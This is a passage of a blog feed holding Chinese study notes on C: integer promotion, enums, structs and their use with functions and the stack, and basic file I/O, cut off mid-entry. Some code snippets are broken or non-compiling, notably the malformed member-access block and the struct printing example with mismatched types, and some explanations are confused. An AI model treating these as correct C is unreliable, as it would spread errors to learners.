class="hljs-string">&quot;%d&quot;</span>,s1.age);<span class="hljs-comment">//2.查找成员</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,si.id);<span class="hljs-comment">//3</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,(*ps).name);<span class="hljs-comment">//与1相同</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,ps-&gt;name);<span class="hljs-comment">//与1相同</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="表达式的求和顺序"><a href="#表达式的求和顺序" class="headerlink" title="表达式的求和顺序"></a>表达式的求和顺序</h2><p>由操作的优先级和结合性决定</p><ol><li><p>隐式类型转换：</p><ul><li><p>整型提升：C的整型算术运算总是至少以缺省整型类型的精度来进行的。 为了获得这个精度，表达式中的字符和短整型操作数在使用之前被转换为普通整型，这种转换称为整型；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> a=<span class="hljs-number">3</span>;<br>    <span class="hljs-comment">//char 占1个字节，一共8个字符</span><br>    <span class="hljs-comment">//a=00000011</span><br>    <span class="hljs-type">char</span> b=<span class="hljs-number">127</span>;<br>    <span class="hljs-comment">//b=01111111</span><br>    <span class="hljs-type">char</span> c=a+b;<span class="hljs-comment">//相加转换为整形</span><br>    <span class="hljs-comment">//a=00000000000000000000000000000011</span><br>    <span class="hljs-comment">//b=00000000000000000000000001111111</span><br>    <span class="hljs-comment">//c=11111111111111111111111110000010</span><br>    <span class="hljs-comment">//根据符号数补齐</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,c);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure></li><li><p>算术运算：将低精度的转换为高精度的</p></li></ul></li><li><p>操作符的属性</p><ul><li>优先级：优先级高的先算</li><li>结合性：</li><li>求值顺序:</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>枚举</title>
    <link href="/2023/04/20/C/%E6%9E%9A%E4%B8%BE/"/>
    <url>/2023/04/20/C/%E6%9E%9A%E4%B8%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h1><h2 id="常量符号化"><a href="#常量符号化" class="headerlink" title="常量符号化"></a>常量符号化</h2><ol><li><p>用符号而不是具体的数字来表示程序中的数字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">int</span> red=<span class="hljs-number">0</span>;<br><span class="hljs-comment">//然后直接使用类型的名字</span><br><span class="hljs-comment">//等等</span><br></code></pre></td></tr></table></figure></li><li><p>枚举是一种用户定义的数据类型，他用关键字<code>enum</code>来声明</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> 枚举类型的名字&#123;</span>名字<span class="hljs-number">0</span>······名字n&#125;;<br></code></pre></td></tr></table></figure></li><li><p>枚举类型的名字通常不直接使用，而是使用大括号里面的名字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">colors</span>&#123;</span>red,yellow,green,numcolors&#125;;<br><span class="hljs-comment">//大括号里面的类型是int 他们从0到n</span><br><span class="hljs-comment">//因为最后一个元素可以用于计数，统计前面有多少个enum</span><br><span class="hljs-comment">//如这里，numcolors就表示有3个enum变量</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">color</span>&#123;</span>red=<span class="hljs-number">1</span>,yellow=<span class="hljs-number">5</span>,green=<span class="hljs-number">3</span>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//使用举例：</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">name</span> &#123;</span>red=<span class="hljs-number">1</span>,green=<span class="hljs-number">10</span>,black=<span class="hljs-number">3</span>&#125;;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,red);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>    <br></code></pre></td></tr></table></figure></li><li><p>枚举常用于定义符号量，声明在main以前</p></li></ol><h2 id="结构类型"><a href="#结构类型" class="headerlink" title="结构类型"></a>结构类型</h2><ol><li><p><code>strcut</code>:声明在主函数内外都可以，但是想要结构可以在更多的函数中运用最好放在，主函数外面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//形式1</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> day;<br><span class="hljs-type">int</span> month;<br><span class="hljs-type">int</span> year;<br>&#125;;<br><span class="hljs-comment">//一定要输入分号</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> <span class="hljs-title">today</span>;</span><br>    <span class="hljs-comment">//可以理解为，struct定义了多个数据类型</span><br>    <span class="hljs-comment">//这里给数据起名字为today</span><br>today.day=<span class="hljs-number">244</span>;<br>    <span class="hljs-comment">//名字加数据类型</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,today.day);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//形式二</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>&#125;p1,p2;<br><span class="hljs-comment">//p1和p2都是一种无名结构，里面有x,y</span><br><span class="hljs-comment">//这种类型不常见，用于周期不长</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<span class="hljs-comment">//（成员变量）</span><br>&#125;p1,p2;<span class="hljs-comment">//变量列表</span><br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> date;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">point</span> <span class="hljs-title">p</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span><br>&#125;n1=&#123;<span class="hljs-number">10</span>,&#123;<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;,<span class="hljs-literal">NULL</span>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>成员初始化是0,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> day;<br><span class="hljs-type">int</span> month;<br><span class="hljs-type">int</span> year;<br>&#125;;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> <span class="hljs-title">today</span>=</span>&#123;<span class="hljs-number">27</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2022</span>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> <span class="hljs-title">chg</span>;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i-%i-%i\n\n&quot;</span>,today.year,today.month,today.day);<br>chg.day=<span class="hljs-number">27</span>;<br>chg.month=<span class="hljs-number">10</span>;<br>chg.year=<span class="hljs-number">2022</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i-%i-%i&quot;</span>,chg.day,chg.month,chg.year);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>结构用.或者-&gt; 运算符和名字访问其他成员，-struct stu</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br>    <span class="hljs-type">int</span> age;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> <span class="hljs-title">chg</span>=</span>&#123;<span class="hljs-string">&quot;chg&quot;</span>,<span class="hljs-number">19</span>&#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> *<span class="hljs-title">i</span>=</span>&amp;chg;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,(*i).name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,i-&gt;name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,chg.name);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>&#125;p1,p2;<br><br><span class="hljs-comment">//访问成员的方式</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> </span><br><span class="hljs-class">    <span class="hljs-title">return</span> 0;</span><br>&#125;<br>p1.x=p1=date.x;<br>p2.y=p2=date.y;<br>p1=p2---&gt;p1.x=p2.x,p1.y=p2.y;<br></code></pre></td></tr></table></figure></li><li><p>结构运算 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> <span class="hljs-title">today</span>=</span>&#123;<span class="hljs-number">27</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2022</span>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">date</span> <span class="hljs-title">chg</span>;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i-%i-%i\n\n&quot;</span>,today.year,today.month,today.day);<br>chg.day=<span class="hljs-number">27</span>;<br>chg.month=<span class="hljs-number">10</span>;<br>chg.year=<span class="hljs-number">2022</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i-%i-%i\n\n&quot;</span>,chg.day,chg.month,chg.year);<br>chg=today;<br>chg.year=<span class="hljs-number">2021</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%i-%i-%i\n\n&quot;</span>,chg.day,chg.month,chg.year);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li><li><p>结构内容的打印</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> age;<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br>    <span class="hljs-type">int</span> number[<span class="hljs-number">20</span>];<br>    <span class="hljs-comment">//必须加数字</span><br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">student</span> <span class="hljs-title">chg</span>=</span>&#123;<span class="hljs-number">19</span>,chg,<span class="hljs-string">&quot;2022124032&quot;</span>&#125;;<br>    <span class="hljs-comment">//字符串的创建用&quot;&quot;</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d,%d,%s&quot;</span>,chg.age,chg.name,chg.number);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>嵌套结构只能，在主函数定义，不能在结构体里面定义，但需要命名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">time</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">int</span> hour;<br><span class="hljs-type">int</span> min;<br><span class="hljs-type">int</span> second;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">today</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">time</span> <span class="hljs-title">now_time</span>;</span><span class="hljs-comment">//不能在这定义now_time的内容，需要定义名字</span><br><span class="hljs-type">int</span> year;<br><span class="hljs-type">int</span> month;<br><span class="hljs-type">int</span> day;<br>&#125;;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">today</span> <span class="hljs-title">TIME</span>=</span>&#123;&#123;<span class="hljs-number">23</span>,<span class="hljs-number">02</span>,<span class="hljs-number">34</span>&#125;,<span class="hljs-number">2022</span>,<span class="hljs-number">10</span>,<span class="hljs-number">28</span>&#125;;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="结构与函数"><a href="#结构与函数" class="headerlink" title="结构与函数"></a>结构与函数</h2><ol><li><p>&amp;可以用取地址取到该结构体变量具体的某一类型的地址，而且可以打印出来 </p></li><li><p>传结构给函数，是传值，如果有函数使用过那该值为0</p></li><li><p>用结构也可以接受函数返回的结构的值</p></li><li><p>将结构体变量传入函数的方法是：将结构体变量地址给函数，函数中用指针接受，然后用指针的用法，指需要用的东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//传址调用</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br>    <span class="hljs-type">int</span> age;<br>&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> stu *chg_1)</span><br>&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,chg_1-&gt;name);<span class="hljs-comment">//chg_1相当于指针的用法</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,(*chg_1).name);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> <span class="hljs-title">chg</span>=</span>&#123;<span class="hljs-string">&quot;chg&quot;</span>,<span class="hljs-number">19</span>&#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> *<span class="hljs-title">i</span>=</span>&amp;chg;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,(*i).name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,i-&gt;name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,chg.name);<br>print(&amp;chg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//传值调用</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> name[<span class="hljs-number">20</span>];<br>    <span class="hljs-type">int</span> age;<br>&#125;;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print2</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> stu chg_2)</span><br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s\n&quot;</span>,chg_2.name);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> <span class="hljs-title">chg</span>=</span>&#123;<span class="hljs-string">&quot;chg&quot;</span>,<span class="hljs-number">19</span>&#125;;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stu</span> *<span class="hljs-title">i</span>=</span>&amp;chg;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,(*i).name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,i-&gt;name);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>,chg.name);<br>print(&amp;chg);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>由于传值调用需要开辟新空间，可能导致栈压力过大，所以更好的方法是传址调用</p><ul><li><p>栈存储数据先进后出，后进的先出</p></li><li><p>函数调用的参数压栈，从下往上存储数据时叫压栈，</p></li><li><p>出栈是从上往下删</p></li></ul></li></ol><h2 id="函数与栈区"><a href="#函数与栈区" class="headerlink" title="函数与栈区"></a>函数与栈区</h2><ol><li>函数调用都会在内存的栈区上，开辟新的空间</li><li>函数传参，从右往左传参</li><li>自己写的函数也要占用空间</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件操作</title>
    <link href="/2023/04/20/C/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <url>/2023/04/20/C/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="什么是文件"><a href="#什么是文件" class="headerlink" title="什么是文件"></a>什么是文件</h2><ol><li><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221111215431353.png" alt="image-20221111215431353"></li><li>数据文件<ul><li>存放程序运行时需要读取的数据</li></ul></li><li>文件名<ul><li>文件名包含：文件路径+文件主干+文件后缀</li><li><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221111215955712.png" alt="image-20221111215955712"></li></ul></li></ol><h2 id="文件的打开和关闭"><a href="#文件的打开和关闭" class="headerlink" title="文件的打开和关闭"></a>文件的打开和关闭</h2><ol><li>文件指针：指向文件地址</li><li>文件信息区：在内存中开辟的名为<code>FILE</code>的结构体变量(由系统声明)</li><li>通过使用<code>FILE*</code>指针来维护FILE结构体</li><li><code>fopen()</code>函数和:</li><li><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221111221059403.png"></li><li><img src="C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221111221754676.png" alt="image-20221111221754676"></li></ol><blockquote><p><code>filename</code>:文件名</p><p><code>mode</code>:打开方式</p><p><code>fopen</code>:打开文件</p><p><code>fclose</code> :关闭文件</p></blockquote><ol start="7"><li>打开文件的方式<ul><li><img src="C:\Users\12414\Desktop\C语言笔记\文件操作\文件操作.assets\image-20221112084050171.png"></li></ul></li></ol><h2 id="文件的读写与关闭"><a href="#文件的读写与关闭" class="headerlink" title="文件的读写与关闭"></a>文件的读写与关闭</h2><ol><li><p>相关函数：</p><ul><li><img src="C:\Users\12414\Desktop\C语言笔记\文件操作\文件操作.assets\image-20221112084625654.png" alt="image-20221112084625654"></li></ul></li><li><p>输入：指从内存中写入到硬盘</p></li><li><p>输出：指从硬盘读取到内存中</p></li><li><p><code>perror</code>():C 库函数 <code>void perror(const char \*str)</code> 把一个描述性错误消息输出到标准错误 <code>stderr</code>。首先输出字符串 <code>str</code>，后跟一个冒号，然后是一个空格。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE* pr=fopen(<span class="hljs-string">&quot;chg.tet&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br><span class="hljs-keyword">if</span>(pr==<span class="hljs-literal">NULL</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;fopen&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="C:\Users\12414\Desktop\C语言笔记\文件操作\文件操作.assets\image-20221112091903125.png" alt="image-20221112091903125"></p></li><li><p><code>fputc（&#39;char&#39;,流的指针）</code>:写一个数据到流里面去</p></li><li><p><code>fgetc</code>:当文件读取正常，返回的是字符的<code>ASCLL</code>码值是个整形，读取错误（读取完成）则返回的是<code>EOF(-1)</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>FILE* pr;<br><span class="hljs-type">int</span> ret;<br><span class="hljs-comment">//打开文件</span><br>pr=fopen(<span class="hljs-string">&quot;chg.tet&quot;</span>,<span class="hljs-string">&quot;r+&quot;</span>);<br><span class="hljs-comment">//文件的判断</span><br><span class="hljs-keyword">if</span>(pr==<span class="hljs-literal">NULL</span>)<br>&#123;<br>perror(<span class="hljs-string">&quot;fopen:&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">//文件写入</span><br><span class="hljs-built_in">fputs</span>(<span class="hljs-string">&quot;c&quot;</span>,pr);<br><span class="hljs-comment">//文件读取</span><br>rewind(pr);<br>ret=fgetc(pr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,ret);<br><span class="hljs-comment">//关闭文件</span><br>fclose(pr);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>fputs</code>:写一个字符串</p><ul><li><pre><code class="c">fputs(&quot;chg,tsy\n&quot;,pr);<figure class="highlight 